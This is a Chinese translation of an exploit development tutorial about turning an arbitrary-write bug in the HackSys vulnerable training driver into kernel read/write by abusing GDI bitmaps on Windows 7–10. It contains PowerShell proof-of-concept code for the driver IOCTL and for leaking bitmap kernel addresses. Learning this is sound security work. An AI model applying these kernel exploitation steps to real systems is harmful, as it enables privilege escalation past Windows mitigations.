@@ -1,0 +1,232 @@
+
+![](upload/attach/201803/530966_MXQX4CPRAP9MZWT.jpg)
+
+![](upload/attach/201803/530966_2ZQR3ZW73HKNR5G.jpg)
+
+> 点击查看[原文](<https://bbs.kanxue.com/elink@f90K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3k6#2P5Y4A6&6M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6@1N6i4c8G2M7X3W2S2L8s2y4Q4x3V1k6W2P5s2m8p5k6i4k6Q4x3V1j5J5x3g2)9J5k6h3S2@1L8h3H3>).
+
+# Windows exploit开发系列教程第十七部分：内核利用程序之滥用GDI Bitmap（Win7-10 32/64位）
+
+欢迎回来！我们将再次通过 [@HackSysTeam's](<https://bbs.kanxue.com/elink@02eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3d9r3q4U0K9#2y4&6M7#2c8W2j5h3@1>). 驱动深入到 ring0 层。本文中我们将重温任意地址任意写漏洞。通过实现一个强大的 ring0 层读写功能我们可以在 32 位和 64 位的 Windows 7/8/8.1/10(pre v1607) 系统上创造一个可以工作的 exploit！如我们即将所见，该技术本质上是一个数据攻击，因此我们将不费力气的绕过 SMEP/SMAP/CFG/RFG 缓解措施，直达胜利！
+
+本技术有一点“复杂”，需要一些预备知识。这一部分我强烈推荐读者在开始阅读本文之前，先阅读下面的资源。最后，为了尝鲜，我们将在 64 位的 Windows 10 系统上开发 exp。那就不跟你多 BB，让我们开始吧！
+
+- HackSysTeam-PSKernelPwn ([@FuzzySec](<https://bbs.kanxue.com/elink@e7aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3c8Y4g2*7P5Y4W2e0k6h3x3>)) - [here](<https://bbs.kanxue.com/elink@c01K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6r3N6i4A6*7P5g2y4W2j5%4g2J5K9i4c8&6i4K6u0r3d9r3q4U0K9#2y4&6M7#2c8W2j5h3#2Q4x3X3c8b7f1@1E0W2M7X3&6W2L8q4m8%4L8R3>).
+- Abusing GDI for ring0 exploit primitives ([@CoreSecurity](<https://bbs.kanxue.com/elink@93cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3b7$3!0J5k6g2y4W2j5%4g2J5K9i4c8&6>)) - [here](<https://bbs.kanxue.com/elink@89fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3j5h3u0#2M7$3W2F1k6#2)9J5k6r3N6V1K9g2)9J5k6r3k6G2M7W2)9J5k6s2u0A6L8X3M7H3i4K6u0V1k6i4S2H3L8r3!0A6N6q4)9J5k6s2m8J5K9h3#2A6N6r3W2$3k6i4x3>).
+- Abusing GDI Reloaded ([@CoreSecurity](<https://bbs.kanxue.com/elink@992K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3b7$3!0J5k6g2y4W2j5%4g2J5K9i4c8&6>)) - [here](<https://bbs.kanxue.com/elink@760K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8%4u0W2M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6K6P5i4y4@1k6h3#2Q4x3V1k6X3K9h3I4W2M7#2)9J5c8Y4m8#2j5X3I4A6j5$3q4@1K9h3!0F1M7#2)9J5c8U0t1H3x3e0k6Q4x3V1j5I4x3q4)9J5c8V1q4T1N6i4y4A6L8X3N6Q4x3X3c8s2c8p5W2Q4x3X3c8d9k6h3I4G2j5h3c8W2k6q4)9J5k6r3g2C8L8%4m8S2M7Y4c8&6i4K6u0V1x3U0l9I4y4W2)9#2k6U0m8Q4x3X3g2H3k6r3j5>).
+- This Time Font hunt you down in 4 bytes ([@keen\_lab](<https://bbs.kanxue.com/elink@bffK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2W2L8W2)9#2k6X3I4S2j5R3>)) - [here](<https://bbs.kanxue.com/elink@e9aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4y4D9K9h3c8W2M7$3S2S2M7X3g2Q4x3X3g2F1k6i4c8Q4x3V1k6b7k6i4c8W2M7V1S2D9j5i4k6S2N6s2W2Q4x3V1k6%4K9h3&6V1L8%4N6K6i4K6u0V1K9$3g2J5L8X3g2D9i4K6u0V1k6i4S2H3L8r3!0A6N6r3q4@1K9h3!0F1i4K6u0V1N6r3S2A6M7#2)9J5k6s2c8A6L8h3g2Q4x3X3c8X3L8$3&6@1i4K6u0V1K9s2g2F1N6q4)9J5k6s2W2G2N6g2)9J5k6r3c8G2N6$3&6Q4x3X3c8A6L8W2)9J5k6o6c8Q4x3X3c8T1P5i4c8W2M7H3>).
+- Terminus Project ([@rwfpl](<https://bbs.kanxue.com/elink@ba4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3M7Y4N6X3M7r3H3>)) - [here](<https://bbs.kanxue.com/elink@986K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4c8W2M7X3#2A6L8Y4g2K6i4K6u0W2M7X3g2%4L8$3I4X3i4K6u0W2M7r3I4Q4x3V1k6@1k6i4u0E0K9h3&6#2M7#2)9J5c8R3>).
+
+## 侦查挑战
+
+我们将直接对第十一部分的任意地址任意写漏洞重新梳理，也就无需再次做完整的解读。我们只想确保我们的任意写在 Win10 上依然可以如期工作。
+
+```powershell
+Add-Type -TypeDefinition @"
+
+using System;
+
+using System.Diagnostics;
+
+using System.Runtime.InteropServices;
+
+using System.Security.Principal;
+
+public static class EVD
+
+{
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+
+    public static extern IntPtr CreateFile(
+
+        String lpFileName,
+
+        UInt32 dwDesiredAccess,
+
+        UInt32 dwShareMode,
+
+        IntPtr lpSecurityAttributes,
+
+        UInt32 dwCreationDisposition,
+
+        UInt32 dwFlagsAndAttributes,
+
+        IntPtr hTemplateFile);
+
+    [DllImport("Kernel32.dll", SetLastError = true)]
+
+    public static extern bool DeviceIoControl(
+
+        IntPtr hDevice,
+
+        int IoControlCode,
+
+        byte[] InBuffer,
+
+        int nInBufferSize,
+
+        byte[] OutBuffer,
+
+        int nOutBufferSize,
+
+        ref int pBytesReturned,
+
+        IntPtr Overlapped);
+
+}
+
+"@
+
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+
+if ($hDevice -eq -1) {
+
+    echo "`n[!] Unable to get driver handle..`n"
+
+    Return
+
+} else {
+
+    echo "`n[>] Driver information.."
+
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+
+    echo "[+] Handle: $hDevice"
+
+}
+
+[byte[]]$Buffer = [System.BitConverter]::GetBytes(0x4141414141414141) + [System.BitConverter]::GetBytes(0x4242424242424242)
+
+echo "`n[>] Sending buffer.."
+
+echo "[+] Buffer length: $($Buffer.Length)"
+
+echo "[+] IOCTL: 0x22200B"
+
+[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+```
+
+看起来我们得到了想要的结果。
+
+![](https://bbs.kanxue.com/upload/attach/201803/530966_TNQ7N8TDMPGZBXS.jpg)
+
+如果你记着第十部分的话就会发现这并不完整。我们写进去的值实际上并不是 `0x4141414141414141`，而是该地址上存储的指针。与此同时，我们的 POC 仅仅在 64 位机上成功运行。我们需要对 exp 的架构独立性进行调整！
+
+我们可以修改 buffer 结构成下面的内容，以成功在 32/64 位机实现任意写。
+
+```powershell
+# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
+#---
+
+[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WriteWhat).Length)
+
+[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WriteWhat), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WriteWhat).Length)
+
+if ($x32Architecture) {
+
+    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($WriteWhere)
+
+} else {
+
+    [byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($WriteWhere)
+
+}
+```
+
+尽管传递了合适的值，它也并不能工作。
+
+## Pwn
+
+简单的工作完成了。我们现在想要的是将一个单一任意写漏洞转换成一个完全的 ring0 读写。在高级别下我们可以：
+
+1. 创建两个 bitmap 对象
+2. 泄露出各自的内核地址
+3. 使用任意写漏洞修改其中一个 bitmap 对象的 header 成员
+4. 使用 `Gdi32` 的 `GetBitmapBits`/`SetBitmapBits` API 调用来读写内核地址空间
+
+![](https://bbs.kanxue.com/upload/attach/201803/530966_KNB88BRENYU7B9J.jpg)
+
+本技术重要的部分在于，当创建一个 bitmap 时，我们可以泄露出其在内核中的地址。这一泄露在 Windows 10 的 v1607 版本之后被打上了补丁，哭哭。
+
+如其所呈现般，当创建一个 bitmap 时，一个结构被附加到了父进程 `PEB` 的 `GdiSharedHandleTable` 中。给定进程 `PEB` 的基地址，`GdiSharedHandleTable` 就在如下的偏移处（分别于 32/64 位）。
+
+```csharp
+[StructLayout(LayoutKind.Explicit, Size = 256)]
+public struct _PEB
+{
+    [FieldOffset(148)]
+    public IntPtr GdiSharedHandleTable32;
+
+    [FieldOffset(248)]
+    public IntPtr GdiSharedHandleTable64;
+}
+```
+
+`PEB` 中的该条目是一个指向 `GDICELL` 结构体数组的指针，它定义了多种不同的 image 类型。该结构体的定义如下：
+
+```csharp
+/// 32bit size: 0x10
+/// 64bit size: 0x18
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _GDI_CELL
+{
+    public IntPtr pKernelAddress;
+    public UInt16 wProcessId;
+    public UInt16 wCount;
+    public UInt16 wUpper;
+    public UInt16 wType;
+    public IntPtr pUserAddress;
+}
+```
+
+让我们用下面的 POC 来看看是否可以在 KD 中手动找到 `_GDI_CELL` 结构体。
+
+```powershell
+Add-Type -TypeDefinition @"
+
+using System;
+
+using System.Diagnostics;
+
+using System.Runtime.InteropServices;
+
+using System.Security.Principal;
+
+public static class EVD
+
+{
+
+    [DllImport("gdi32.dll")]
+
+    public static extern IntPtr CreateBitmap(
+
+        int nWidth,
+
+        int nHeight,
+
+        uint cPlanes,
+
+        uint cBitsPerPel,
+
+        IntPtr lpvBits);
+
+}
+
+"@
+
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+
+$Bitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+
+"{0:X}" -f [int]$Bitmap
+```
+
+运行 POC，立即得到了一个 bitmap 句柄，可以看到它不是一个标准的句柄值（看起来太大了）。
+
+![](https://bbs.kanxue.com/upload/attach/201803/530966_F3D6V9TXAA5MZC6.jpg)
+
+实际上，bitmap 句柄的最后两个字节是该结构在 `GdiSharedHandleTable` 数组中的索引（=> `handle & 0xffff`）。于是，让我们跳转到 KD 来看看是否可以找到我们新创建的 bitmap 的 `_GDI_CELL` 结构。
+
+![](https://bbs.kanxue.com/upload/attach/201803/530966_BKZG4SM34TNHK2V.jpg)
